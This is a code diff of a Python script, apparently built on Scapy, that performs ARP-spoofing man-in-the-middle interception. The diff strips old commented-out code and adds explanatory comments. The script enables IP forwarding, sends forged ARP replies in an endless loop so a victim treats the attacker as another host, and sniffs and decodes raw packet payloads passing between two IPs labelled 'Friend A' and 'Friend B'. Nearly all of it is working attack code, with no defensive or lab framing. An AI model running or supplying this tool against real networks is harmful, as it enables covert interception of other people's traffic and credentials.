@@ -25,21 +25,11 @@ def enable_ip_forwarding():
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # this is a special file used for ip forwarding and echo 1 writes 1 in this file hence enabling the ip forwarding
     print("[Done] IP Forwarding Enabled")
 
-# def arp_spoof(victim_ip, target_ip):
-#     """ Sends spoofed ARP packets to victim using resolved MAC """
-#     victim_mac = getmacbyip(victim_ip)
-#     if not victim_mac:
-#         print(f"[Sorry] Could not resolve MAC address for {victim_ip}")
-#         return
-
-#     packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
-    
-#     while True:
-#         send(packet, verbose=False)
 
 def arp_spoof(victim_ip, target_ip):
     """ Sends spoofed ARP packets to trick victim into thinking we are target """
-    packet = Ether() / ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
+    packet = Ether() / ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)     # broadcasting the packet as we don't know the MAC of targets
+    # op = 2 means ARP reply
     while True:
         send(packet, verbose=False)
     
@@ -51,7 +41,6 @@ def sniff_packets(interface):
         if packet.haslayer(IP):         # to check if the packet has IP layer header
             src = packet[IP].src
             dst = packet[IP].dst
-            # print(f"[+] Packet: {src} --> {dst}")
 
             if packet.haslayer("Raw"):  # This checks if the packet contains a Raw layer. The Raw layer contains the actual data/payload of the packet
                 payload = packet["Raw"].load.decode('utf-8', errors="ignore")  # ignore undecodable bytes
@@ -65,9 +54,6 @@ if __name__ == "__main__":
     friend_b = sys.argv[2]
     interface = sys.argv[3]
 
-    # friend_a = input("Enter Friend A IP: ")
-    # friend_b = input("Enter Friend B IP: ")
-    # interface = input("Enter network interface (e.g., eth0, wlan0): ")
 
     enable_ip_forwarding()
 
